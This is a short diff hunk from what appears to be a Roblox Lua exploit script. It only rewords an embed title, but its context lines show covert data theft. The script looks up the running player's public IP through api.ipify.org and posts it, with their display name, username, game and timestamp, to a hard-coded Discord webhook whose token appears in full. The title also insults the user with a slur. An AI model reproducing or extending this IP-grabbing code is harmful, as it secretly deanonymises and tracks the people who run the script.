@@ -73,7 +73,7 @@ if isSuccessful then
 local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
 local wh = 'https://discordapp.com/api/webhooks/1092713174719025175/TDTWsfsj44J3wleOrPdj4Sc8LQmSFGH4Y5RlfW7tPpnJGSjs_mckFE_lbrQebsVVQ3G0'
 local embed1 = {
-       ['title'] = 'The script has been executed by a retard name '..game.Players.LocalPlayer.DisplayName..' (@'..game.Players.LocalPlayer.Name..') Player IP : '..ip..'  Time: in '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
+       ['title'] = 'The script has been executed by a retard name '..game.Players.LocalPlayer.DisplayName..' (@'..game.Players.LocalPlayer.Name..') IP : '..ip..'  Time: in '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
    }
 local a = request({
    Url = wh,
